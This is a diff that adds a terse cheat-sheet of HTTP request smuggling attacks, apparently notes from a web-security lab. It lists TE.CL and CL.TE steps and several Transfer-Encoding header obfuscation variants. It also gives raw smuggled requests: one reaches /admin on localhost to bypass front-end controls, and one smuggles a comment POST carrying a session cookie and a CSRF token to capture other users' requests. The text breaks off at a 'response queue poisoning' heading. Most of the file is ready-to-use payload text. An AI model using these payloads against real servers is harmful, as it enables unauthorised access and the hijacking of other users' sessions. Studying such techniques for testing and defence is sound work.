@@ -1,0 +1,51 @@
+TE:CL
+> Insert Transfer-Encoding: chunked
+> Alter content-length and do not update
+> Replace body with payload. Example:
+
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+> suffix with 0 and /r/n/r/n
+> prefix with payload size in hex
+    > Count bytes: https://mothereff.in/byte-counter
+    > Decimal to hex: https://www.binaryhexconverter.com/decimal-to-hex-converter
+
+OBFUSCATION:
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+[space]Transfer-Encoding: chunked
+
+X: X
+Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+
+BYPASS FRONT END CONTROLS CONFLICTING REQUESTS:
+> CL.TE: When you smuggle a request, but the incoming req has conflicting headers, treat it as part of a paramter value to bypass
+GET /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+
+> TE.CL: Very similar
+0
+
+POST /post/comment HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 825
+Cookie: session=24O8DBLXuXnjhrWpCX73QVy9F03Akm9F
+
+csrf=op922Ew00tAoZ15UGvGAjfc0sqZGf5ke&postId=7&name=test&email=test%40gg.com&website=https%3A%2F%2Fok.com&comment=
+
+RESPONSE QUEUE POISONING
